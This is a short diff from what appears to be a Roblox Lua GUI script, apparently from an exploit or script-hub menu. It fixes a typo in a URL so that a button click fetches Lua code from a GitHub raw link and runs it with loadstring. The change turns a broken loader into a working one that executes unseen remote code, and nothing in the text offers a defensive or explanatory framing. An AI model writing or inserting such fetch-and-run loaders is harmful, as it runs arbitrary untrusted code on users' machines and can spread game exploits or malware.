@@ -423,7 +423,7 @@ local function OORTEJ_fake_script() -- fghj_3.1
 	local script = Instance.new('Script', fghj_3)
 
 	script.Parent.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet(('hhttps://raw.githubusercontent.com/pateu198/swearee/main/gfg'),true))()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/pateu198/swearee/main/gfg'),true))()
 	end)
 	
 end
